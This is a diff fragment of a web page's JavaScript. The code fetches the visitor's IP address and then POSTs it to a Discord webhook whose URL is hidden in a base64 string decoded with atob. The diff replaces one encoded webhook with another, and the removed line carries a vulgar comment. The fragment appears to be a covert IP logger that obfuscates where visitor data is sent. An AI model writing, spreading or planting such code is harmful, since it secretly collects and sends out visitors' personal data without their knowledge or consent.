@@ -234,11 +234,9 @@
                 const data = await response.json();
                 ipDisplay.textContent = `IP Address: ${data.ip}`;
 
-                
-                const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjI4OTk5Mjk1NzEwNDEzOC9qVkFyeGdRT3F6LWRqRlN4YzNLRzNTT0VPeWJ5b0ZPTkRKR0FPNF8tNE9XeWhLRUJzQUwzQkp3ZHJqeEZxOWZ1Wkx3Qw==';
-                const webhookUrl = atob(encodedWebhook); // Jerk Fat Dick Pussy
+                const encodedPart1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMjI4OTk5Mjk1NzEwNDEzOC9qVkFyeGdRT3F6LWRqRlN4YzNLRzNTT0VPeWJ5b0ZPTkRKR0FPNC1fNE9XeWhLRUJzQUwzQkp3ZHJqeEZxOWZ1WkxmQw==";
+                const webhookUrl = atob(encodedPart1); // Try....
 
-                
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
